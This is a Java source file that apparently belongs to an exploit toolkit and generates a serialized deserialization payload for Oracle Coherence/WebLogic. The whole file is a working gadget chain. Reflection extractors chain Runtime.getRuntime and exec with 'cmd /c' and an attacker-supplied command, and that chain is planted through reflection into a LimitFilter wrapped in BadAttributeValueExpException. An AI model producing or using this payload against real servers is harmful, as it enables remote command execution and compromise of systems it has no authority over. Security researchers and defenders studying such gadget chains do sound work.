package com.feihong.payload;

import com.feihong.utils.Reflections;
import com.feihong.utils.Util;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class BasicCMDpayload {
    public static byte[] generate(String cmd) throws Exception {
        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getMethod",
                new Object[]{"getRuntime", new Class[0]}
        );

        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "invoke",
                new Object[]{null, new Object[0]}
        );

        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "exec",
                new Object[]{new String[]{"cmd", "/c", cmd}}
        );

        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3,
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
        LimitFilter limitFilter = new LimitFilter();

        //m_comparator
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);

        //m_oAnchorTop
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, Runtime.class);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);


        return Util.serialize(badAttributeValueExpException);
    }
}
